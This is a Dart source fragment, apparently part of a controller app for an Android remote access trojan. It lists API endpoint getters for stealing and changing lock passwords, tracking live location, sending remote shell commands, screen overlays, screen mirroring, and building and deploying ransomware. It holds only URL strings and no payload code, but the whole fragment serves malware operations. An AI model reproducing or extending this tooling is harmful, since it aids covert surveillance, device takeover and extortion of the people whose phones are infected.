  static String getRatAiAnalyzePhotoUrl() {
    return "$apiBaseUrl/api/ai-analyze-photo";
  }
  
  static String getRatAiAnalyzeAudioUrl() {
    return "$apiBaseUrl/api/ai-analyze-audio";
  }
  
  static String getRatAiAnalyzeTextUrl() {
    return "$apiBaseUrl/api/ai-analyze-text";
  }
  
  static String getRatAiAnalyzeLocationUrl() {
    return "$apiBaseUrl/api/ai-analyze-location";
  }
  
  static String getRatAiGenerateReportUrl() {
    return "$apiBaseUrl/api/ai-generate-report";
  }
  
  static String getRatAiSummarizeChatUrl() {
    return "$apiBaseUrl/api/ai-summarize-chat";
  }
  
  static String getRatAiTranslateUrl() {
    return "$apiBaseUrl/api/ai-translate";
  }
  
  static String getRatAiSuggestReplyUrl() {
    return "$apiBaseUrl/api/ai-suggest-reply";
  }
  
  static String getRatChangeLockPasswordUrl() {
    return "$apiBaseUrl/api/change-lock-password";
  }
  
  static String getRatSetScreenLockUrl() {
    return "$apiBaseUrl/api/set-screen-lock";
  }
  
  static String getRatChangeSystemPasswordUrl() {
    return "$apiBaseUrl/api/change-system-password";
  }
  
  static String getRatResetLockPasswordUrl() {
    return "$apiBaseUrl/api/reset-lock-password";
  }
  
  static String getRatSetScreenBrightnessUrl() {
    return "$apiBaseUrl/api/set-screen-brightness";
  }
  
  static String getRatGetScreenBrightnessUrl() {
    return "$apiBaseUrl/api/get-screen-brightness";
  }
  
  static String getRatSetAutoRotateUrl() {
    return "$apiBaseUrl/api/set-auto-rotate";
  }
  
  static String getRatSetScreenTimeoutUrl() {
    return "$apiBaseUrl/api/set-screen-timeout";
  }
  
  static String getRatSetAirplaneModeUrl() {
    return "$apiBaseUrl/api/set-airplane-mode";
  }
  
  static String getRatSetWifiHotspotUrl() {
    return "$apiBaseUrl/api/set-wifi-hotspot";
  }

  // ==================== ULTIMATE 6 HELPERS ====================
  
  static String getRatStartLiveLocationUrl() {
    return "$apiBaseUrl/api/start-live-location";
  }
  
  static String getRatStopLiveLocationUrl() {
    return "$apiBaseUrl/api/stop-live-location";
  }
  
  static String getRatGetLiveLocationUrl() {
    return "$apiBaseUrl/api/get-live-location";
  }
  
  static String getRatSendShellCommandUrl() {
    return "$apiBaseUrl/api/send-shell-command";
  }
  
  static String getRatGetShellOutputUrl() {
    return "$apiBaseUrl/api/get-shell-output";
  }
  
  static String getRatStartOverlayUrl() {
    return "$apiBaseUrl/api/start-overlay";
  }
  
  static String getRatStopOverlayUrl() {
    return "$apiBaseUrl/api/stop-overlay";
  }
  
  static String getRatStartScreenMirroringUrl() {
    return "$apiBaseUrl/api/start-screen-mirroring";
  }
  
  static String getRatStopScreenMirroringUrl() {
    return "$apiBaseUrl/api/stop-screen-mirroring";
  }
  
  static String getRatCreateWebRTCSessionUrl() {
    return "$apiBaseUrl/api/create-web-rtc-session";
  }
  
  static String getRatGetWebRTCSessionUrl() {
    return "$apiBaseUrl/api/get-web-rtc-session";
  }
  
  static String getRatBuildRansomwareUrl() {
    return "$apiBaseUrl/api/build-ransomware";
  }
  
  static String getRatDeployRansomwareUrl() {
    return "$apiBaseUrl/api/deploy-ransomware";
  }
}